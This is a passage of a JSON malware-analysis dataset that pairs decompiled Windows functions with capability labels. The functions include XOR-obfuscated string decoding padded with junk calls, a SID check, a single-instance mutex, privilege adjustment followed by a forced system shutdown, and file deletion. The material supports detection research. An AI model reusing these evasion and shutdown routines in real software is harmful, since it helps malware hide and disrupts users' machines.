        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040cc05(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x56626919;\n                var_30h = 0x4f444a62;\n                var_2ch = 0x69675363;\n                var_28h = 0x4a6b567e;\n                var_24h._0_2_ = 0x4f69;\n                var_20h = 0x564f694a;\n                var_1ch._0_1_ = 0x53;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetMessagePos)();\n                    if (iVar5 != 0x446176) {\n                        var_10h = 5;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 870
    },
    "00403ff2": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ff2(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint lpBuffer;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_8h = param_1;\n    do {\n        *0x41da90 = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(param_1, 0x80000000, 3, 0, 3, 0, 0);\n        if (iVar2 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n            while ((iVar3 != 0 && (param_1 = var_8h,  lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41da90 = *0x41da90 >> 8 ^ *((uVar1 ^ *0x41da90 & 0xff) * 4 + 0x4114f0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0);\n                param_1 = var_8h;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n            iVar2 = fcn.0040c4bf(0x41dac4);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 448
    },
    "004087c4": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.004087c4(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar1 == 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0040e9af": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nuint fcn.0040e9af(void)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0040e3c1();\n        if (iVar1 != 0) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n    }\n    fcn.0040e379();\n    return 0;\n}\n",
        "token_count": 84
    },
    "00402277": {
        "rules": [
            "check mutex"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402277(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x63126120;\n    var_38h = 0x61055738;\n    var_34h = 0x5729631e;\n    var_30h = 0x63326116;\n    var_2ch = 0x61075724;\n    var_28h = 0x57336305;\n    var_24h = 0x63186123;\n    var_20h = 0x611d5723;\n    var_1ch = 0x571e6303;\n    var_18h = 0x6305611b;\n    var_14h = 0x6112572f;\n    var_10h = 0x574a6313;\n    var_ch = 0x63776173;\n    var_8h._0_2_ = 0x574a;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0x6f7a85) {\n            var_4h = 6;\n            *(iVar4 + iVar2) = *(&var_ch + iVar4 % 6) ^ (iVar4 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x30);\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar2);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar2);\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 644
    },
    "004085c6": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004085c6(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint lpType;\n    uint lpcbData;\n    uint namelen;\n    \n    namelen = 0;\n    uVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(reloc.WS2_32.dll_bind, param_1, &namelen);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        lpType = 1;\n        lpcbData = 0x400;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(namelen, param_2, 0, &lpType, 0x41dde0, &lpcbData);\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(namelen);\n    }\n    return uVar1 & 0xffffff00 | bVar2;\n}\n",
        "token_count": 217
    },
    "004059e5": {
        "rules": [
            "check process job object/8aaf725824be4e7b84101cffc1f879ea",
            "open process"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004059e5(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.0040618c();\n        if (iVar2 != 0) {\n            iVar4 = fcn.004063bc();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 188
    },
    "0040de20": {
        "rules": [
            "contain loop",
            "modify access privileges",
            "shutdown system"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040de20(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t var_4h;\n    \n    var_34h = 0x10182a23;\n    var_30h = 0x20140d34;\n    var_2ch = 0xb11163c;\n    var_28h = 0x14223919;\n    var_24h = 0x4f151e24;\n    var_10h = 0x784b4f70;\n    var_ch._0_2_ = 0x7941;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 6;\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0x2af717) {\n            *(iVar5 + iVar3) = *(&var_10h + iVar5 % var_4h) ^ (iVar5 + iVar3)[&var_34h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar3, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar1 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar5 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar5 == 0) {\n        (*pcVar1)(4, 0);\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 616
    },
    "0040ee89": {
        "rules": [
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ee89(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x3308155b;\n    var_14h = 0x6025522;\n    var_10h = 0x854263c;\n    var_ch._0_1_ = 0x69;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x50696738;\n    var_4h._0_1_ = 0x49;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar2 != 0x586626) {\n            var_1ch = 5;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.0040bfd5();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 582
    },
    "0040c44d": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040c44d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 338
    },
    "0040cb6d": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040cb6d(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.0040c44d();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040ad3b();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 192
    },
    "0040cda0": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040cda0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 453
    }
}